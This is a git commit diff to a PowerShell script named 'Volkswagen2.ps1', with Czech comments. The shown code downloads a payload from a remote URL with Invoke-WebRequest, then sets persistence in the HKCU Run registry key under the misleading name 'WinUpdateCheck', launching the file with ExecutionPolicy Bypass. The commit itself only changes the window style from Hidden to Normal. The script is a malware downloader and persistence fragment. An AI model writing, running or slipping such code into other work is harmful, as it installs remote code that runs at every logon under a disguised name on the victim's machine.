1754c0ca4c8d5fe1b13a5a9895f35a8b945e7acd
JiriWeiss <75065909+JiriWeiss@users.noreply.github.com>
2025-05-21 11:45:08 +0200

    Update Volkswagen2.ps1

--- Volkswagen2.ps1
+++ Volkswagen2.ps1
@@ -6,6 +6,6 @@ Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath
 # 2. Nastav persistenci přes HKCU Run (nevyžaduje admin)
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $regName = "WinUpdateCheck"
-$regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`""
+$regValue = "powershell.exe -WindowStyle Normal -ExecutionPolicy Bypass -File `"$localPath`""
 
 Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
